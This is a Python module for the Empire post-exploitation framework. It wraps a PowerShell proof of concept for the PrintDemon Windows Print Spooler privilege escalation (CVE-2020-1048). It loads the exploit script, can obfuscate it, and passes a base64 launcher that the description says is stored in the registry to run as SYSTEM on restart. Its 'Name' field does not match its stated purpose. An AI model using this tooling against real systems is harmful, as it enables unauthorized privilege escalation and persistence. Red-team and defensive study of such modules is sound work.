from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Get Group Policy Preferences',

            # list of one or more authors for the module
            'Author': ['@hubbl3', '@Cx01N'],

            # more verbose multi-line description of the module
            'Description':  'This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048'
                            ' is a privilege escalation vulnerability that allows a persistent'
                            ' threat through Windows Print Spooler. The vulnerability allows an'
                            ' unprivileged user to gain system-level privileges. Based on'
                            ' @ionescu007 PoC. The module prints a dll named ualapi.dll which' 
                            ' is loaded to System32. The module then places a launcher in the'
                            ' registry which executes code as system on restart.',

            'Software': '',

            'Techniques': ['TA0004'],

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'powershell',

            # the minimum language version needed
            'MinLanguageVersion' : '5',

            # list of any references/other comments
            'Comments': ['https://github.com/BC-SECURITY/Invoke-PrintDemon']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is required
                'Description'   :   'Agent to run on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LauncherCode' : {
                # Base64 code download cradle
                'Description'   :   'Base64 launcher code',
                'Required'      :   True,
                'Value'         :   ''
            },
            'PrinterName': {
                # The printer name to be used when registering the PrintDemon printer
                'Description': 'Optional name for the registered printer',
                'Required': False,
                'Value': ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-PrintDemon.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-PrintDemon"

        # Add any arguments to the end execution of the script
        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])

        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        return script